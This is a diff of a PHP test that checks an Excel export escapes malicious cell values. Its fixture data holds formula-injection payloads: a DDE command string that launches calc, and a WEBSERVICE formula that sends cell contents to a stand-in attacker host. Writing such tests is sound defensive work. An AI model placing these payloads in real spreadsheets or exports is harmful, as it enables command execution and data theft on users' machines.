@@ -1,7 +1,6 @@
 <?php
 
 use App\Models\Comercio;
-use App\Models\Cultivo;
 use App\Models\Propiedad;
 use App\Models\StaffUser;
 use App\Models\User;
@@ -33,17 +32,10 @@ test('la exportacion excel escribe valores maliciosos como texto y nunca como fo
 
     $producer = User::factory()->create([
         'name' => "=cmd|' /C calc'!A0",
-    ]);
-
-    $propiedad = Propiedad::factory()->for($producer, 'usuario')->create([
-        'calle' => '=WEBSERVICE("http://atacante.evil/?c="&A1)',
-        'rut' => true,
-        'rut_valor' => '+12345678',
-    ]);
-
-    Cultivo::factory()->for($propiedad, 'propiedad')->create([
-        'variedad' => '@texto',
-        'tipo' => '-Horticola',
+        'email' => '=WEBSERVICE("http://atacante.evil/?c="&A1)',
+        'direccion' => '-Horticola',
+        'telefono' => '+12345678',
+        'dni' => '@texto',
     ]);
 
     $response = $this->actingAs($admin, 'staff')
